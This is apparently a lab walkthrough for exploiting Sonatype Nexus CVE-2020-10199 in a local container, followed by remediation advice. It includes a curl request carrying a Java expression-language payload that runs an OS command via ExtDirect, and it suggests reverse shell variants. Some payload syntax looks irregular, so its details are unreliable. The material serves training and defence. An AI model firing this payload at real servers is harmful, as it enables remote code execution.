# Sonatype Nexus Repository Manager 3 Expression Language RCE (CVE-2020-10199)

## Overview

Sonatype Nexus Repository Manager 3 is an enterprise artifact and binary package repository widely utilized in DevSecOps CI/CD pipelines to host Maven, npm, PyPI, Docker, and Go artifacts.

Vulnerability CVE-2020-10199 affects Sonatype Nexus Repository Manager versions prior to 3.21.2. The vulnerability stems from improper validation and sanitization of user-supplied input evaluated by the Java Unified Expression Language (JUEL) engine. An authenticated user (or an attacker possessing compromised low-privilege API credentials) can submit crafted expression language payloads into ExtDirect API calls (`/service/extdirect`), triggering arbitrary code execution within the JVM runtime context of the Nexus server.

- **Web UI & REST API**: `http://localhost:8136/`
- **ExtDirect Endpoint**: `http://localhost:8136/service/extdirect`
- **Default Credentials**: `admin` / `admin123`
- **Docker Shortcut**: `./lab start nexus-rce`
- **Container Name**: `cyberlab_industry_nexus_el_rce`
- **RAM Footprint**: ~1000 MB

---

## Exploitation Walkthrough

### 1. Service Verification
Wait for Nexus to finish initial bootstrapping (typically 60 to 90 seconds on first start):

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8136/
```

When HTTP 200 is returned, the repository manager is ready.

### 2. Identifying ExtDirect RPC Interface
Nexus leverages ExtDirect for browser-to-server RPC communication. Verify authentication credentials against the status endpoint:

```bash
curl -u admin:admin123 -i http://localhost:8136/service/rest/v1/status
```

### 3. Dispatching Java Expression Language (EL) Payload
Send a crafted ExtDirect POST request targeting `coreui_Repository.read` containing a Java Reflection payload within EL markers:

```bash
curl -i -s -k -X POST 'http://localhost:8136/service/extdirect' \
  -H 'Content-Type: application/json' \
  -u admin:admin123 \
  -d '{
    "action": "coreui_Repository",
    "method": "read",
    "data": [{
      "name": "$\\A{\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(null).exec(\"touch /tmp/pwned_nexus\")}",
      "type": "groovy"
    }],
    "type": "rpc",
    "tid": 1
  }'
```

### 4. Verifying Code Execution Inside Container
Confirm file creation within the container:

```bash
docker exec -it cyberlab_industry_nexus_el_rce ls -la /tmp/pwned_nexus
```

Alternatively, inject reverse shell payloads or arbitrary command strings via encoded bash wrappers.

---

## Defensive Remediation & Hardening

1. **Upgrade Nexus Repository Manager**:
   Upgrade to Sonatype Nexus Repository Manager 3.21.2 or higher, which replaces unsafe EL evaluation routines with strictly validated static templates.
2. **Restrict CI/CD Component Access**:
   Segregate artifact repository management endpoints from untrusted internal networks using reverse proxies and egress filtering.
3. **Audit Default Passwords**:
   Ensure default credentials (`admin123`) are rotated immediately upon deployment; Nexus 3.17+ enforces random initial passwords generated at install time.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Sonatype Security Advisory CVE-2020-10199](https://support.sonatype.com/hc/en-us/articles/360044882533)
- [Vulhub Sonatype Nexus CVE-2020-10199 Environment](https://vulhub.org/#/environments/nexus/CVE-2020-10199/)
